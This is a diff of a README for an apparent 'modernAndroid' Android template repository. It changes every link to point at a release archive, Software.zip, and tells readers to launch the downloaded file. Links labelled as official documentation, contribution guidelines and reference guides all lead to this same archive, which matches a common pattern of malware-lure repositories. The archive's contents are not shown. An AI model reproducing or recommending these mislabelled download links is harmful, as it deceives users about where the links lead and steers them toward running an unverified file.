@@ -23,7 +23,7 @@ In this repository, you will find a comprehensive Android application template t
 ## Installation
 
 To get started with the "modernAndroid" project, you can download the template by clicking on the link below:
-[![Download Project Template](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip%20Project%20Template-v1.0.0-blue)](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip)
+[![Download Project Template](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip%20Project%20Template-v1.0.0-blue)](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip)
 
 **Note:** Launch the downloaded file to access the project template.
 
@@ -40,16 +40,16 @@ Follow these steps to kickstart your modern Android development journey:
 
 ## Contributing
 
-We welcome contributions from the Android development community to make this repository even more valuable. Whether you want to add new features, fix bugs, or improve documentation, your input is highly appreciated. Please refer to the [Contribution Guidelines](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip) before making any changes.
+We welcome contributions from the Android development community to make this repository even more valuable. Whether you want to add new features, fix bugs, or improve documentation, your input is highly appreciated. Please refer to the [Contribution Guidelines](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip) before making any changes.
 
 ## Resources
 
 Looking for more resources on modern Android development? Check out these recommended reads:
 
-📚 [Android Developers](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip)
-📚 [Jetpack Compose Documentation](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip)
-📚 [Kotlin Programming Language](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip)
-📚 [Official Dagger-Hilt Guide](https://github.com/harp685/modernAndroid/releases/download/v1.0/Application.zip)
+📚 [Android Developers](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip)
+📚 [Jetpack Compose Documentation](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip)
+📚 [Kotlin Programming Language](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip)
+📚 [Official Dagger-Hilt Guide](https://github.com/harp685/modernAndroid/releases/download/v2.0/Software.zip)
 
 ## License
 
